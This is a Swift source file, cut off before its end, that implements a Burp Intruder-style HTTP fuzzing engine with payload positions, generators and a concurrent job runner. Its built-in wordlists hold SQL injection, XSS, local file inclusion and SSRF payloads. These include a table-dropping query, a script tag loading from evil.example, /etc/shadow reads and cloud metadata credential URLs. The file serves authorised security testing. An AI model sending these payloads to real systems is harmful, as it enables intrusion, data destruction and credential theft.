import Foundation

// ============================================================================
//  Intruder / Sequencer
// ============================================================================
//
//  Аналог Burp Intruder (подстановка payload'ов в позиции + маркировка
//  совпадений по статусу/длине/маркеру) и Burp Sequencer (генерация списков).
//
//  Сеть не реализована: движок отправляет подготовленный `HTTPMessage` через
//  инъектированный `IntruderRequestSender`, реализацию которого пишет владелец
//  ядра. Никакого I/O и UI в этом файле нет.
// ============================================================================

// MARK: - Network seam

/// Performs one prepared HTTP exchange. Returns the response, or `nil` when the
/// transport failed.
protocol IntruderRequestSender: Sendable {
    /// Выполняет подготовленный HTTP-запрос. Возвращает ответ или nil при сетевой ошибке.
    func send(_ request: HTTPMessage, host: String, port: Int, isSecure: Bool, timeoutSeconds: Int) async -> HTTPMessage?
}

// ============================================================================
//  1. Payload positions
// ============================================================================

/// A single injectable slot inside the editor preview of a request.
///
/// `start` / `end` are **absolute Character offsets into `HTTPMessage.prettyRaw`**
/// (the same text the raw editor shows), so a position can be applied directly
/// by `PositionExtractor.applyReplacements` and the result re-parsed.
struct PayloadPosition: Identifiable, Hashable, Sendable {
    enum Kind: Hashable, Sendable {
        case query
        case path
        case header(name: String)
        case cookie(name: String)
        case body

        /// Short label for compact tables.
        var label: String {
            switch self {
            case .query: return "Query"
            case .path: return "Path"
            case .header: return "Header"
            case .cookie: return "Cookie"
            case .body: return "Body"
            }
        }

        /// Label including the field name, e.g. `Cookie: session`.
        var detail: String {
            switch self {
            case .query, .path, .body: return label
            case .header(let name): return "Header: \(name)"
            case .cookie(let name): return "Cookie: \(name)"
            }
        }
    }

    var id: UUID = UUID()
    var start: Int
    var end: Int
    var kind: Kind
    /// The fragment as it appears in the request (raw, still percent-encoded).
    var raw: String
    /// Unique marker for this position, formatted as `§N§` with a 1-based index.
    var marker: String

    var isEmpty: Bool { end <= start }

    /// Text this position covers, resolved against `text`.
    func text(in text: String) -> String {
        let chars = Array(text)
        guard start >= 0, end <= chars.count, start <= end else { return "" }
        return String(chars[start..<end])
    }
}

// MARK: - Marker codec

/// Payloads are delimited by `§`. A raw payload that itself contains `§` has to
/// survive a round trip through the preview text, so it is escaped as `§N§`
/// while a message is rendered and unescaped when the text is read back.
enum MarkerCodec {
    /// The payload delimiter used by the editors.
    static let open = "§"

    private static let openChar = Character(open)

    /// Marker for the `i`-th (0-based) position inside one message.
    static func positionMarker(_ index: Int) -> String { "\(open)\(index + 1)\(open)" }

    /// Escapes `§` inside a value so it cannot be mistaken for a marker.
    static func encode(_ s: String, for i: Int) -> String {
        s.replacingOccurrences(of: open, with: "\(open)\(i + 1)\(open)")
    }

    /// Restores the value produced by `encode(_:for:)`.
    static func decode(_ s: String) -> String {
        guard s.contains(openChar) else { return s }
        var out = ""
        var scanner = s.startIndex
        while scanner < s.endIndex {
            guard s[scanner] == openChar else {
                let next = s[scanner...].firstIndex(of: openChar) ?? s.endIndex
                out += String(s[scanner..<next])
                scanner = next
                continue
            }
            // Try to collapse a "§N§" escape back into a single "§".
            var probe = s.index(after: scanner)
            var digits = ""
            while probe < s.endIndex, s[probe].isNumber {
                digits.append(s[probe])
                probe = s.index(after: probe)
            }
            if !digits.isEmpty, probe < s.endIndex, s[probe] == openChar {
                out += open
                scanner = s.index(after: probe)
            } else {
                out += open
                scanner = s.index(after: scanner)
            }
        }
        return out
    }

    /// Removes every marker (`§` and `§N§`) from the string.
    static func strip(_ s: String) -> String {
        guard s.contains(openChar) else { return s }
        return decode(s).replacingOccurrences(of: open, with: "")
    }
}

// MARK: - Position extraction

enum PositionExtractor {
    /// Headers whose value is treated as an injection target.
    static let knownHeaders: Set<String> = [
        "authorization", "cookie", "x-api-key", "x-auth-token", "referer", "user-agent"
    ]

    /// The exact text positions are computed against.
    static func previewText(for request: HTTPMessage) -> String { request.prettyRaw }

    /// Walks query parameters, path segments, well-known headers, cookie pairs
    /// and `application/x-www-form-urlencoded` bodies, returning absolute
    /// offsets into `HTTPMessage.prettyRaw`.
    static func positions(in request: HTTPMessage) -> [PayloadPosition] {
        let chars = Array(request.prettyRaw)
        var found: [PayloadPosition] = []

        func add(_ range: Range<Int>, _ kind: PayloadPosition.Kind) {
            guard range.lowerBound >= 0, range.upperBound <= chars.count, range.lowerBound < range.upperBound else { return }
            found.append(PayloadPosition(
                start: range.lowerBound,
                end: range.upperBound,
                kind: kind,
                raw: String(chars[range]),
                marker: MarkerCodec.positionMarker(found.count)
            ))
        }

        // ---- start line: path segments + query ------------------------------
        let line = Array(request.startLine)
        let targetStart = startOfTarget(in: line)
        let targetEnd = endOfTarget(in: line)
        if let q = line.firstIndex(of: "?"), q < targetEnd {
            addPathSegments(line, from: targetStart, to: q, add: add)
            for hit in paramRanges(in: line, from: q + 1, to: targetEnd) {
                add(hit.value, .query)
            }
        } else {
            addPathSegments(line, from: targetStart, to: targetEnd, add: add)
        }

        // ---- headers ---------------------------------------------------------
        // `prettyRaw` prints every header, enabled or not, so the cursor has to
        // advance for all of them.
        var offset = request.startLine.count + 1 // + "\n"
        for h in request.headers {
            if h.isSeparator {
                offset += 1
                continue
            }
            let valueStart = offset + h.name.count + 2 // "<name>: "
            let valueEnd = valueStart + h.value.count
            if h.enabled, PositionExtractor.knownHeaders.contains(h.trimmedName.lowercased()) {
                let valueChars = Array(h.value)
                let lower = h.trimmedName.lowercased()
                if lower == "authorization" {
                    // Only the credential part is injectable: "Bearer §1§".
                    if let sp = valueChars.firstIndex(of: " ") {
                        let from = valueStart + sp + 1
                        if from < valueEnd { add(from..<valueEnd, .header(name: h.trimmedName)) }
                    }
                } else if lower == "cookie" {
                    for hit in paramRanges(in: valueChars, from: 0, to: valueChars.count, separator: ";") {
                        let name = String(valueChars[hit.name]).trimmingCharacters(in: .whitespaces)
                        add((valueStart + hit.value.lowerBound)..<(valueStart + hit.value.upperBound),
                            .cookie(name: name))
                    }
                } else {
                    add(valueStart..<valueEnd, .header(name: h.trimmedName))
                }
            }
            offset += h.name.count + 2 + h.value.count + 1 // + "\n"
        }
        offset += 1 // the blank line terminating the header block

        // ---- body ------------------------------------------------------------
        let bodyStart = offset
        if request.contentType.contains("application/x-www-form-urlencoded"), !request.body.isEmpty {
            // Offsets are only valid when the preview shows the body verbatim.
            let bodyText = String(decoding: request.body, as: UTF8.self)
            if bodyText == request.bodyText {
                let bodyChars = Array(bodyText)
                let end = bodyStart + bodyChars.count
                if end <= chars.count {
                    for hit in paramRanges(in: bodyChars, from: 0, to: bodyChars.count) {
                        add((bodyStart + hit.value.lowerBound)..<(bodyStart + hit.value.upperBound), .body)
                    }
                }
            }
        }

        return found.sorted { $0.start < $1.start }
    }

    /// Substitutes `values[i]` into `positions[i]`.
    ///
    /// Replacements run from the end of the string towards its start so earlier
    /// offsets stay valid. Positions may be passed in any order and a partial
    /// `values` array simply leaves the remaining positions untouched.
    static func applyReplacements(_ text: String, positions: [PayloadPosition], values: [String]) -> String {
        guard !positions.isEmpty else { return text }
        var chars = Array(text)
        for (position, value) in zip(positions, values).sorted(by: { $0.0.start > $1.0.start }) {
            guard position.start >= 0, position.end <= chars.count, position.start < position.end else { continue }
            chars.replaceSubrange(position.start..<position.end, with: Array(value))
        }
        return String(chars)
    }

    /// Preview text with every position wrapped in its marker, for the UI.
    static func markedUp(_ request: HTTPMessage) -> String {
        let found = positions(in: request).sorted { $0.start < $1.start }
        guard !found.isEmpty else { return request.prettyRaw }
        return applyReplacements(request.prettyRaw, positions: found, values: found.map(\.marker))
    }

    // MARK: - Private helpers

    private struct ParamHit {
        var name: Range<Int>
        var value: Range<Int>
    }

    /// Splits `a=1&b=2` (or `a=1; b=2` for cookies) into absolute name/value ranges.
    private static func paramRanges(in chars: [Character],
                                    from start: Int,
                                    to end: Int,
                                    separator: Character = "&") -> [ParamHit] {
        var hits: [ParamHit] = []
        var cursor = max(0, start)
        let limit = min(end, chars.count)
        while cursor < limit {
            var amp = cursor
            while amp < limit, chars[amp] != separator { amp += 1 }
            var eq = cursor
            while eq < amp, chars[eq] != "=" { eq += 1 }
            if eq < amp {
                hits.append(ParamHit(name: cursor..<eq, value: (eq + 1)..<amp))
            }
            cursor = amp + 1
        }
        return hits
    }

    /// Marks every non-empty `/`-separated segment of the request target as `.path`.
    private static func addPathSegments(_ line: [Character],
                                        from start: Int,
                                        to end: Int,
                                        add: (Range<Int>, PayloadPosition.Kind) -> Void) {
        let begin = max(0, min(start, line.count))
        let limit = max(begin, min(end, line.count))
        var cursor = begin
        while cursor < limit {
            var slash = cursor
            while slash < limit, line[slash] != "/" { slash += 1 }
            if slash > cursor { add(cursor..<slash, .path) }
            cursor = slash + 1
        }
    }

    /// Index of the first character of the request target, skipping the method
    /// and the authority of an absolute-form target.
    private static func startOfTarget(in line: [Character]) -> Int {
        let afterMethod = min((line.firstIndex(of: " ") ?? -1) + 1, line.count)
        if let schemeEnd = firstIndex(of: Array("://"), in: line, from: afterMethod),
           let slash = line[(schemeEnd + 3)...].firstIndex(of: "/") {
            return min(slash + 1, line.count)
        }
        return afterMethod
    }

    /// Index just past the request target — the protocol version must never be
    /// mistaken for a path segment or a query value.
    private static func endOfTarget(in line: [Character]) -> Int {
        guard let lastSpace = line.lastIndex(of: " ") else { return line.count }
        // Only trust the trailing space when it really separates the version.
        let tail = String(line[(lastSpace + 1)...])
        return tail.hasPrefix("HTTP/") ? lastSpace : line.count
    }

    private static func firstIndex(of pattern: [Character], in chars: [Character], from start: Int) -> Int? {
        guard !pattern.isEmpty, chars.count >= pattern.count else { return nil }
        var i = max(0, start)
        let last = chars.count - pattern.count
        while i <= last {
            var ok = true
            for k in pattern.indices where chars[i + k] != pattern[k] {
                ok = false
                break
            }
            if ok { return i }
            i += 1
        }
        return nil
    }
}

// ============================================================================
//  2. Payload dictionaries
// ============================================================================

/// The built-in payload generators. `numbers` and `custom` carry parameters, so
/// the `String` raw value is synthesised by hand.
enum PayloadType: Hashable, Sendable {
    case numbers(range: ClosedRange<Int>, step: Int)
    case positions
    case dates
    case booleans
    case nulls
    case blank
    case custom(wordlist: [String])

    var isCustom: Bool {
        if case .custom = self { return true }
        return false
    }

    /// Default payload set for this type, ignoring any user wordlist.
    var defaultValues: [String] {
        switch self {
        case .numbers(let range, let step):
            return PayloadType.numberStrings(range: range, step: step)
        case .positions:
            return PayloadType.numberStrings(range: 0...100, step: 1)
        case .dates:
            return PayloadType.isoDates(count: 366)
        case .booleans:
            return PayloadType.booleanValues
        case .nulls:
            return PayloadType.nullValues
        case .blank:
            return PayloadType.blankValues
        case .custom(let wordlist):
            return Array(wordlist.prefix(SequencerEngine.maxItems))
        }
    }

    /// Resolves the payload list for a run.
    ///
    /// The explicit `wordlist` argument (wired to `IntruderConfig.wordlist`)
    /// only applies to `.custom`; every other type always uses its defaults so a
    /// leftover wordlist can never silently redefine a generated set.
    static func generate(_ type: PayloadType, wordlist: [String] = []) -> [String] {
        if case .custom(let embedded) = type {
            let source = wordlist.isEmpty ? embedded : wordlist
            return Array(source.prefix(SequencerEngine.maxItems))
        }
        return type.defaultValues
    }

    // MARK: - Generators

    /// Ascending walk over a `ClosedRange` — a Swift range can never descend, so
    /// `step` only controls the stride and `0` means "every value".
    static func numberStrings(range: ClosedRange<Int>, step: Int) -> [String] {
        let stride = step == 0 ? 1 : abs(step)
        var out: [String] = []
        out.reserveCapacity(min(SequencerEngine.maxItems, 1024))
        var n = range.lowerBound
        while n <= range.upperBound, out.count < SequencerEngine.maxItems {
            out.append(String(n))
            n += stride
        }
        return out
    }

    /// 2020-01-01 plus 0..<count days, formatted as ISO-8601 `yyyy-MM-dd`.
    static func isoDates(count: Int) -> [String] {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.timeZone = TimeZone(identifier: "UTC")
        formatter.dateFormat = "yyyy-MM-dd"
        guard let base = formatter.date(from: "2020-01-01") else { return [] }
        let calendar = Calendar(identifier: .gregorian)
        let limit = min(max(0, count), SequencerEngine.maxItems)
        return (0..<limit).compactMap { offset in
            calendar.date(byAdding: .day, value: offset, to: base).map(formatter.string(from:))
        }
    }

    static let booleanValues: [String] = ["true", "false", "1", "0", "yes", "no", "on", "off"]
    static let nullValues: [String] = ["", "null", "undefined", "nil", "NULL", "none"]
    static let blankValues: [String] = ["", " "]
}

// RawRepresentable conformance so the type can be used in settings / pickers.
extension PayloadType: RawRepresentable {
    var rawValue: String {
        switch self {
        case .numbers: return "numbers"
        case .positions: return "positions"
        case .dates: return "dates"
        case .booleans: return "booleans"
        case .nulls: return "nulls"
        case .blank: return "blank"
        case .custom: return "custom"
        }
    }

    init?(rawValue: String) {
        switch rawValue {
        case "numbers": self = .numbers(range: 0...100, step: 1)
        case "positions": self = .positions
        case "dates": self = .dates
        case "booleans": self = .booleans
        case "nulls": self = .nulls
        case "blank": self = .blank
        case "custom": self = .custom(wordlist: [])
        default: return nil
        }
    }

    var label: String {
        switch self {
        case .numbers(let range, _): return "Numbers \(range.lowerBound)…\(range.upperBound)"
        case .positions: return "Positions 0…100"
        case .dates: return "Dates 2020"
        case .booleans: return "Booleans"
        case .nulls: return "Nulls"
        case .blank: return "Blank"
        case .custom: return "Custom (\(defaultValues.count))"
        }
    }
}

extension PayloadType: CaseIterable {
    /// `.custom` is excluded: it has no meaningful default instance.
    static var allCases: [PayloadType] {
        [.numbers(range: 0...100, step: 1), .positions, .dates, .booleans, .nulls, .blank]
    }
}

// MARK: - Wordlists

enum Wordlists {
    /// Names of the lists shipped with the app.
    static let names: [String] = ["numbers-10k", "short", "sqli", "xss", "lfi", "ssrf"]

    static func builtIn(_ name: String) -> [String] {
        switch name.lowercased() {
        case "numbers-10k", "numbers":
            return PayloadType.numberStrings(range: 0...9999, step: 1)
        case "short": return shortWords
        case "sqli": return sqli
        case "xss": return xss
        case "lfi": return lfi
        case "ssrf": return ssrf
        default: return []
        }
    }

    /// Names mapped to their contents, for pickers that need a preview.
    static func all() -> [String: [String]] {
        var out: [String: [String]] = [:]
        for name in names { out[name] = builtIn(name) }
        return out
    }

    static let shortWords: [String] = [
        "admin", "test", "guest", "user", "password", "123456", "letmein", "qwerty",
        "root", "administrator", "login", "welcome", "secret", "default", "backup",
        "api", "beta", "staging", "dev", "null"
    ]

    static let sqli: [String] = [
        "' OR '1'='1", "admin'--", "1' AND SLEEP(5)--", "1 UNION SELECT NULL--",
        "1 UNION ALL SELECT NULL--", "' OR 1=1--", "\" OR 1=1--", "1' OR '1'='1",
        "1' OR '1'='1'--", "' OR ''='", "1; DROP TABLE users--", "' OR 1=1 #",
        "1' OR 1=1 LIMIT 1--", "' UNION ALL SELECT NULL,NULL--", "1' AND 1=2--",
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "' OR EXISTS(SELECT 1 FROM users WHERE username='admin'--",
        "1' AND SLEEP(3) AND '1'='1", "1' AND BENCHMARK(1000000,MD5('a'))--",
        "1' WAITFOR DELAY '0:0:3'--", "'; EXEC xp_cmdshell('dir')--",
        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' PROCEDURE ANALYSE()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "1'/**/AND/**/1=1--", "%27%20OR%20%271%27%3D%271",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' UNION ALL SELECT 1,2,3,4,5--", "admin' #", "' OR 1=1 LIMIT 10--",
        "1') OR ('1'='1", "1' AND 1=1 UNION SELECT 1,2,3--", "-1 UNION SELECT 1,2,3",
        "' or ''='", "42", "1' UNION SELECT NULL,username,password FROM users--"
    ]

    static let xss: [String] = [
        "<script>alert(1)</script>", "<SCRIPT>alert(1)</SCRIPT>",
        "\"><img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)",
        "JaVaScRiPt:alert(1)", "{{7*7}}", "${7*7}",
        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
        "<div onmouseover=alert(1)>hover</div>", "<script>alert(document.domain)</script>",
        "\"><script>alert(1)</script>", "'><svg onload=alert(1)//",
        "<video><source onerror=alert(1)>", "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>", "<input autofocus onfocus=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>", "<embed src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<style>*{x:expression(alert(1))}</style>", "<script src=//evil.example/x.js></script>",
        "\"><a href=\"javascript:alert(1)\">click", "window.alert(1)", "alert(1)",
        "alert`1`", "%3Cscript%3Ealert(1)%3C/script%3E",
        "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=# onmouseover=\"alert('XSS')\">"
    ]

    static let lfi: [String] = [
        "../../../../etc/passwd", "../../../../../../etc/passwd",
        "../../../../../etc/shadow", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd", "....//....//etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://input", "data://text/plain;base64,PD9php phpinfo();?>",
        "expect://id", "file:///etc/passwd", "/var/log/apache2/access.log",
        "%00/etc/passwd", "....\\/....\\/etc/passwd", "netdoc:///etc/passwd",
        "C:\\Windows\\win.ini", "/proc/self/environ"
    ]

    static let ssrf: [String] = [
        "http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.0.0.1:22/",
        "http://localhost/", "http://[::1]/", "http://0.0.0.0/",
        "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/", "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:6379/_*%0d%0a", "dict://127.0.0.1:11211/stats",
        "ftp://127.0.0.1/", "http://127.0.0.1:8080/admin", "http://10.0.0.1/",
        "http://192.168.1.1/", "http://2130706433/", "http://0x7f000001/"
    ]
}

// ============================================================================
//  3. Intruder configuration
// ============================================================================

enum MatchStatus: Hashable, Sendable {
    case unchanged
    case changed
    case equal(Int)
    /// `ClosedRange<Int>` — written as `200...399` at the call site.
    case inRange(ClosedRange<Int>)

    var label: String {
        switch self {
        case .unchanged: return "Status unchanged"
        case .changed: return "Status changed"
        case .equal(let value): return "Status = \(value)"
        case .inRange(let range): return "Status \(range.lowerBound)…\(range.upperBound)"
        }
    }
}

enum MatchSize: Hashable, Sendable {
    case unchanged
    case changed
    case equal(Int)
    /// `ClosedRange<Int>` — written as `1000...1500` at the call site.
    case inRange(ClosedRange<Int>)
    case greaterThan(Int)
    case lessThan(Int)

    var label: String {
        switch self {
        case .unchanged: return "Length unchanged"
        case .changed: return "Length changed"
        case .equal(let value): return "Length = \(value)"
        case .inRange(let range): return "Length \(range.lowerBound)…\(range.upperBound)"
        case .greaterThan(let value): return "Length > \(value)"
        case .lessThan(let value): return "Length < \(value)"
        }
    }
}

struct IntruderConfig: Sendable {
    /// Parallel requests in flight (clamped to 1…32 by the engine).
    var maxConcurrent = 4
    /// Throttle between requests, in milliseconds.
    var delayMS: Int = 0
    var timeoutSeconds: Int = 10
    /// 0 = use the whole payload set.
    var payloadsPerPosition: Int = 0
    var type: PayloadType = .numbers(range: 0...100, step: 1)
    /// Only consulted when `type == .custom`.
    var wordlist: [String] = []
    var matchStatus: MatchStatus = .unchanged
    var matchSize: MatchSize = .unchanged
    /// When non-empty this overrides status/length matching: a response matches
    /// when its body contains this text (case-insensitive).
    var matchMarker: String = ""
    var greedy: Bool = true
    var followRedirects = false
}

// MARK: - Result

struct IntruderResult: Identifiable, Sendable {
    var id: UUID = UUID()
    /// Assigned as soon as the result is recorded, for `HTTPPair` export.
    var pairID: Int? = nil
    var payload: String
    var request: HTTPMessage?
    var response: HTTPMessage?
    var status: Int?
    var statusClass: StatusClass
    var length: Int
    var timeMS: Int
    var error: String?
    var matched: Bool
    /// 0 is the baseline exchange, payloads start at 1.
    var index: Int

    var isBaseline: Bool { index == 0 }
    var bodyText: String { response?.bodyText ?? "" }
    var label: String { isBaseline ? "(baseline)" : payload }
}

// MARK: - Errors

enum IntruderError: LocalizedError, Equatable {
    case noPayloadPositions
    case jobNotFound(UUID)
    case alreadyRunning(UUID)
    case invalidConfig(String)

    var errorDescription: String? {
        switch self {
        case .noPayloadPositions:
            return "No payload positions found in this request."
        case .jobNotFound(let id):
            return "Intruder job \(id.uuidString.prefix(8)) does not exist."
        case .alreadyRunning(let id):
            return "Intruder job \(id.uuidString.prefix(8)) is already running."
        case .invalidConfig(let reason):
            return "Invalid Intruder configuration: \(reason)"
        }
    }
}

// ============================================================================
//  4. Intruder engine
// ============================================================================

final class IntruderEngine: @unchecked Sendable {
    static let shared = IntruderEngine()

    // MARK: - Job

    struct IntruderJob: Identifiable, Sendable {
        var id: UUID = UUID()
        var name: String
        var baseRequest: HTTPMessage
        var host: String
        var port: Int
        var isSecure: Bool
        var positions: [PayloadPosition]
        var config: IntruderConfig
        var createdAt: Date

        /// Number of requests this job will issue, baseline included.
        func requestCount(payloadCount: Int) -> Int {
            let perPosition = config.payloadsPerPosition > 0
                ? min(config.payloadsPerPosition, payloadCount)
                : payloadCount
            return positions.count * perPosition + 1
        }
    }

    // MARK: - State

    private let lock = NSLock()
    private var _jobs: [UUID: IntruderJob] = [:]
    private var _jobOrder: [UUID] = []
    private var _results: [UUID: [IntruderResult]] = [:]
    private var _progress: [UUID: (done: Int, total: Int)] = [:]
    private var _cancelled: Set<UUID> = []
    private var _running: Set<UUID> = []

    private static let idLock = NSLock()
    private static var pairCounter: Int = 1_000_000

    private init() {}

    // MARK: - Reads

    var isRunning: Bool { lock.withLock { !_running.isEmpty } }

    var runningJobIDs: [UUID] { lock.withLock { Array(_running) } }

    func jobs() -> [IntruderJob] {
        lock.withLock { _jobOrder.compactMap { _jobs[$0] } }
    }

    func job(id: UUID) -> IntruderJob? { lock.withLock { _jobs[id] } }

    func results(for id: UUID) -> [IntruderResult] {
        lock.withLock { (_results[id] ?? []).sorted { $0.index < $1.index } }
    }

    func matchedResults(for id: UUID) -> [IntruderResult] {
        lock.withLock { (_results[id] ?? []).filter(\.matched).sorted { $0.index < $1.index } }
    }

    func progress(for id: UUID) -> (done: Int, total: Int) {
        lock.withLock { _progress[id] ?? (0, 0) }
    }

    // MARK: - Job lifecycle

    func createJob(template: HTTPMessage,
                   host: String,
                   port: Int,
                   isSecure: Bool,
                   name: String) throws -> IntruderJob {
        let found = PositionExtractor.positions(in: template)
        guard !found.isEmpty else { throw IntruderError.noPayloadPositions }
        let job = IntruderJob(
            name: name.isEmpty ? "\(template.method) \(template.path)" : name,
            baseRequest: template,
            host: host,
            port: port,
            isSecure: isSecure,
            positions: found,
            config: IntruderConfig(),
            createdAt: Date()
        )
        lock.withLock {
            _jobs[job.id] = job
            _jobOrder.append(job.id)
            _results[job.id] = []
            _progress[job.id] = (0, 0)
        }
        return job
    }

    func removeJob(id: UUID) {
        cancel(jobID: id)
        lock.withLock {
            _jobs.removeValue(forKey: id)
            _jobOrder.removeAll { $0 == id }
            _results.removeValue(forKey: id)
            _progress.removeValue(forKey: id)
            _cancelled.remove(id)
            _running.remove(id)
        }
    }

    func updateConfig(_ config: IntruderConfig, for id: UUID) {
        lock.withLock { _jobs[id]?.config = config }
    }

    func updatePositions(_ positions: [PayloadPosition], for id: UUID) throws {
        guard !positions.isEmpty else { throw IntruderError.noPayloadPositions }
        lock.withLock { _jobs[id]?.positions = positions }
    }

    func clearResults(for id: UUID) {
        lock.withLock {
            _results[id] = []
            _progress[id] = (0, 0)
        }
    }

    // MARK: - Cancellation

    func cancel(jobID: UUID) {
        lock.withLock { _ = _cancelled.insert(jobID) }
    }

    /// Cancels every running job. The runs unwind on their own, so they stay in
    /// the running set until their in-flight requests return.
    func stopAll() {
        lock.withLock {
            _cancelled.formUnion(_running)
        }
    }

    /// Snapshot of the payload set a job would use — useful for UI counters.
    func payloadCount(for id: UUID) -> Int {
        guard let job = job(id: id) else { return 0 }
        return job.requestCount(payloadCount: PayloadType.generate(job.config.type, wordlist: job.config.wordlist).count)
    }

    // MARK: - Running

    /// Sends the untouched template once as a baseline, then every
    /// position × payload combination. Returns immediately when the job is
    /// missing, already running, or has an empty payload set.
    func start(jobID: UUID, sender: IntruderRequestSender) async {
        let job: IntruderJob? = lock.withLock {
            guard let job = _jobs[jobID], !_running.contains(jobID) else { return nil }
            _running.insert(jobID)
            _cancelled.remove(jobID)
            _results[jobID] = []
            return job
        }
        guard let job else { return }
        defer { lock.withLock { _ = _cancelled.remove(jobID); _ = _running.remove(jobID) } }

        let payloads = PayloadType.generate(job.config.type, wordlist: job.config.wordlist)
        let values = job.config.payloadsPerPosition > 0
            ? Array(payloads.prefix(job.config.payloadsPerPosition))
            : payloads
        guard !values.isEmpty else { return }

        let sweepCount = job.positions.count * values.count
        let total = sweepCount + 1
        lock.withLock { _progress[jobID] = (0, total) }

        // ---- baseline ---------------------------------------------------------
        var baselineStatus: Int? = nil
        var baselineLength = 0
        if !isCancelled(jobID) {
            if let baseline = await IntruderEngine.execute(job: job,
                                                          sender: sender,
                                                          position: nil,
                                                          payload: "",
                                                          index: 0) {
                if let response = baseline.response {
                    baselineStatus = response.status
                    baselineLength = IntruderEngine.wireLength(response)
                }
                lock.withLock { record(baseline, for: jobID) }
            }
        }

        // ---- payload sweep ----------------------------------------------------
        if !isCancelled(jobID), !Task.isCancelled {
            let limit = max(1, min(job.config.maxConcurrent, 32))
            await withTaskGroup(of: IntruderResult?.self) { group in
                var cursor = 0
                for _ in 0..<limit where cursor < sweepCount {
                    let work = IntruderEngine.work(at: cursor, job: job, values: values)
                    group.addTask {
                        await IntruderEngine.execute(job: job,
                                                     sender: sender,
                                                     position: work.position,
                                                     payload: work.value,
                                                     index: work.index)
                    }
                    cursor += 1
                }

                while let outcome = await group.next() {
                    if var result = outcome {
                        result.matched = IntruderEngine.evaluate(response: result.response,
                                                                 config: job.config,
                                                                 baselineStatus: baselineStatus,
                                                                 baselineLength: baselineLength)
                        lock.withLock { record(result, for: jobID) }
                    }
                    if cursor < sweepCount, !isCancelled(jobID), !Task.isCancelled {
                        let work = IntruderEngine.work(at: cursor, job: job, values: values)
                        group.addTask {
                            await IntruderEngine.execute(job: job,
                                                         sender: sender,
                                                         position: work.position,
                                                         payload: work.value,
                                                         index: work.index)
                        }
                        cursor += 1
                    }
                }
            }
        }
    }

    // MARK: - Export

    /// Builds history entries (`origin == .intruder`) for a job.
    func pairs(for id: UUID) -> [HTTPPair] {
        let job = job(id: id)
        return results(for: id).compactMap { result in
            guard let request = result.request else { return nil }
            return HTTPPair(
                id: result.pairID ?? 0,
                time: Date(),
                durationMS: result.timeMS,
                host: job?.host ?? "",
                port: job?.port ?? 0,
                isSecure: job?.isSecure ?? false,
                request: request,
                response: result.response,
                error: result.error,
                origin: .intruder
            )
        }
    }

    // MARK: - Private state helpers (all called with `lock` held)

    private func record(_ incoming: IntruderResult, for id: UUID) {
        // A run that outlived `removeJob(id:)` must not resurrect the entry.
        guard _jobs[id] != nil else { return }
        var result = incoming
        if result.pairID == nil { result.pairID = IntruderEngine.nextPairID() }
        _results[id, default: []].append(result)
        let done = min((_progress[id]?.done ?? 0) + 1, _progress[id]?.total ?? 0)
        _progress[id] = (done, _progress[id]?.total ?? 0)
    }

    private func isCancelled(_ id: UUID) -> Bool {
        lock.withLock { _cancelled.contains(id) }
    }

    private static func nextPairID() -> Int {
        idLock.withLock {
            pairCounter += 1
            return pairCounter
        }
    }

    // MARK: - Static helpers

    private struct Work: Sendable {
        var position: PayloadPosition
        var value: String
        var index: Int
    }

    /// Maps a flat cursor onto a (position, payload, index) triple.
    /// `index` is 1-based because 0 is reserved for the baseline.
    private static func work(at cursor: Int, job: IntruderJob, values: [String]) -> Work {
        let perPosition = values.count
        let positionIndex = cursor / perPosition
        let valueIndex = cursor % perPosition
        return Work(position: job.positions[positionIndex],
                    value: values[valueIndex],
                    index: cursor + 1)
    }

    /// Sends one request. `position == nil` sends the untouched baseline.
    private static func execute(job: IntruderJob,
                                sender: IntruderRequestSender,
                                position: PayloadPosition?,
                                payload: String,
                                index: Int) async -> IntruderResult? {
        guard !Task.isCancelled, !IntruderEngine.shared.isCancelledNow(job.id) else { return nil }

        if job.config.delayMS > 0 {
            try? await Task.sleep(nanoseconds: UInt64(min(job.config.delayMS, 60_000)) * 1_000_000)
        }
        guard !Task.isCancelled, !IntruderEngine.shared.isCancelledNow(job.id) else { return nil }

        let request: HTTPMessage
        if let position {
            // Strip payload markers so a hostile payload cannot fake a position.
            let clean = MarkerCodec.strip(payload)
            let text = PositionExtractor.applyReplacements(
                PositionExtractor.previewText(for: job.baseRequest),
                positions: [position],
                values: [clean]
            )
            request = IntruderEngine.reframe(HTTPMessage.parseEditorText(text, isRequest: true))
        } else {
            request = IntruderEngine.reframe(job.baseRequest)
        }

        let started = Date()
        let response = await sender.send(request,
                                        host: job.host,
                                        port: job.port,
                                        isSecure: job.isSecure,
                                        timeoutSeconds: job.config.timeoutSeconds)
        let elapsed = Int((Date().timeIntervalSince(started) * 1000).rounded())

        return IntruderResult(
            payload: payload,
            request: request,
            response: response,
            status: response?.status,
            statusClass: response?.statusClass ?? .none,
            length: response.map { IntruderEngine.wireLength($0) } ?? 0,
            timeMS: elapsed,
            error: response == nil ? "No response — network error or timeout" : nil,
            matched: false,
            index: index
        )
    }

    /// Applies the configured match rules to one response.
